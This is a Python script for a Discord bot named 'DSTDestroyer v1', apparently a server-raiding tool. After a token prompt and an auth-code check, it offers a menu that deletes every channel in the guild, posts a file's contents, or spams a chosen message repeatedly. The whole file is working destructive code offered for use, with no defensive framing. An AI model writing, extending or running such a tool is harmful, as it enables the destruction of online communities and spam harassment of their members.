import discord
from discord.ext import commands
import pyfiglet
import hashlib
import random
import time

print(pyfiglet.figlet_format('DSTDestroyer v1'))

token = input('Token: ')
bot = commands.Bot('.')

auth = hashlib.md5(str(random.randint(10000,99999999)).encode()).hexdigest()
print(f'''Please enter the command: 

.verify {auth}

Into your server so we can confirm it is you.
''')

@bot.command()
async def verify(ctx, token1):
  input('Press enter when you are ready to start.')
  global auth
  
  if token1 == auth:
    while 1:
      choice = input('''
DEL: Finish Off
SENDM: Send message.txt
SPAM: Send Message many times
Choice: ''')
      if choice == 'del' or choice == 'DEL':
          for c in ctx.guild.channels:
            await c.delete()
            print(f'Deleted {c}')
      if choice == 'sendm' or choice == 'SENDM':
        await ctx.send(open('message.txt').read())
      if choice == 'spam' or choice == 'SPAM':
        times = int(input('How many times to send message: '))
        message = input('Message: ')
        for i in range(1, times+1):
          await ctx.send(message)
        
    else:
      print('Wrong auth...')
        

bot.run(token)




